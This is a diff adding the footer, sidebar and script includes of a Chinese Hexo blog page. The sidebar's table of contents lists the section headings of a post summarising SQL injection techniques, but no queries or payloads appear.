+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="Set3rnal" />
+            
+              <p class="site-author-name" itemprop="name">Set3rnal</p>
+              <p class="site-description motion-element" itemprop="description">勿忘初心</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/mrupdate" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:zhangmenrenhh@gmail.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://weibo.com/3517137212" target="_blank" title="Weibo">
+                    
+                      <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#常用测试语句"><span class="nav-number">1.</span> <span class="nav-text">常用测试语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-mysql-select"><span class="nav-number">2.</span> <span class="nav-text">0x00 mysql select</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-注释符"><span class="nav-number">2.1.</span> <span class="nav-text">1.注释符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-字符串连接方式"><span class="nav-number">2.2.</span> <span class="nav-text">2.字符串连接方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-常用函数"><span class="nav-number">2.3.</span> <span class="nav-text">3.常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-注入步骤"><span class="nav-number">2.4.</span> <span class="nav-text">4.注入步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-mysql-读取写入文件"><span class="nav-number">2.5.</span> <span class="nav-text">5.mysql 读取写入文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql报错注入"><span class="nav-number">3.</span> <span class="nav-text">mysql报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#floor-函数报错"><span class="nav-number">3.1.</span> <span class="nav-text">floor 函数报错</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ExtractValue-有长度限制-最长32位"><span class="nav-number">3.2.</span> <span class="nav-text">ExtractValue(有长度限制,最长32位)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UpdateXml"><span class="nav-number">3.3.</span> <span class="nav-text">UpdateXml</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NAME-CONST-适用于低版本"><span class="nav-number">3.4.</span> <span class="nav-text">NAME_CONST(适用于低版本)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Error-based-Double-Query-Injection"><span class="nav-number">3.5.</span> <span class="nav-text">Error based Double Query Injection</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql-盲注"><span class="nav-number">4.</span> <span class="nav-text">mysql 盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于布尔的盲注"><span class="nav-number">4.1.</span> <span class="nav-text">基于布尔的盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于时间的盲注"><span class="nav-number">4.2.</span> <span class="nav-text">基于时间的盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql特性"><span class="nav-number">5.</span> <span class="nav-text">mysql特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、大小写利用"><span class="nav-number">5.1.</span> <span class="nav-text">1、大小写利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、字符截断利用"><span class="nav-number">5.2.</span> <span class="nav-text">2、字符截断利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、超过长度截断利用"><span class="nav-number">5.3.</span> <span class="nav-text">3、超过长度截断利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、MySQL等号同PHP-对等号两端不同数据类型强制转换"><span class="nav-number">5.4.</span> <span class="nav-text">4、MySQL等号同PHP  对等号两端不同数据类型强制转换</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ACCESS注入"><span class="nav-number">6.</span> <span class="nav-text">ACCESS注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tips"><span class="nav-number">7.</span> <span class="nav-text">tips</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Mysql无逗号注入："><span class="nav-number">7.1.</span> <span class="nav-text">Mysql无逗号注入：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rollup"><span class="nav-number">7.2.</span> <span class="nav-text">Rollup</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heartbeat"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Set3rnal</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://0xsisrazz.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://www.set3rnal.xyz/2016/12/11/Sql注入总结/';
+          this.page.identifier = '2016/12/11/Sql注入总结/';
+          this.page.title = 'Sql注入总结';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://0xsisrazz.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
